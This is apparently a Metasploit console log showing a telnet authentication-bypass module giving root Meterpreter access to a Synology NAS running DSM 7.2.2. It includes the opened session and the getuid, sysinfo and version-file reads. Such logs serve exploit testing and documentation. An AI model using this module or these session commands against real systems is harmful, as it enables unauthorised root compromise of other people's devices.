[*] 111.111.1.1:23 - Incoming Bytes: 0x5b 0x31 0x5d TSPEED 0x31 0x34 0x39 0x36 0x31 NAOFFD NAOCRD OUTMRK 0x5b 0x30 0x31 0x3b 0x33 0x32 0x6d 0x72 0x6f 0x6f 0x74 0x40 0x72 0x61 0x67 0x65 0x6e 0x61 0x73 OUTMRK 0x5b 0x30 0x30 0x6d 0x3a OUTMRK 0x5b 0x30 0x31 0x3b 0x33 0x34 0x6d 0x7e OUTMRK 0x5b 0x30 0x30 0x6d XDISPLOC TSPEED NAOFFD NAOCRD OUTMRK 0x5b 0x30 0x31 0x3b 0x33 0x32 0x6d 0x72 0x6f 0x6f 0x74 0x40 0x72 0x61 0x67 0x65 0x6e 0x61 0x73 OUTMRK 0x5b 0x30 0x30 0x6d 0x3a OUTMRK 0x5b 0x30 0x31 0x3b 0x33 0x34 0x6d 0x7e OUTMRK 0x5b 0x30 0x30 0x6d XDISPLOC TSPEED
[*] Meterpreter session 8 opened (222.222.2.222:9114 -> 111.111.1.1:42414) at 2026-02-21 08:45:57 -0500

msf exploit(linux/telnet/gnu_inetutils_auth_bypass) > sessions -i 8
[*] Starting interaction with 8...

meterpreter > getuid
Server username: root
meterpreter > sysinfo
Computer     : synologynas
OS           :  (Linux 3.10.108)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > cat /etc.defaults/VERSION
majorversion="7"
minorversion="2"
major="7"
minor="2"
micro="2"
buildphase="GM"
buildnumber="72806"
smallfixnumber="5"
nano="5"
base="72806"
productversion="7.2.2"
os_name="DSM"
builddate="2025/11/10"
buildtime="10:35:42"
meterpreter > cat /proc/sys/kernel/syno_hw_version
RS1219+-j
```